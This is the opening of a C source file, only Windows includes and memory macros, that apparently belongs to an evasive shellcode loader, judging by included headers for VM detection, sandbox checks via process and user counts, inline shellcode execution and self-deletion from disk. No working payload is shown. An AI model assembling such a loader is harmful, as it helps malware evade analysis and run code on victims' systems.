#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <comdef.h>
#include <comutil.h>
#include <wbemidl.h>
#include <string.h>

#define MemCopy         __builtin_memcpy
#define MemSet          __stosb
#define MemZero( p, l ) __stosb( p, 0, l )

#include "debug.h"

#include "GetProcessCountViaSnapShot.h"
#include "GetUniqueUserCountViaSnapshot.h"
#include "AbsoluteValue.h"
#include "VmDetection.h"
#include "InlinedShellcodeExecution.h"
#include "DeleteSelfFromDisk.h"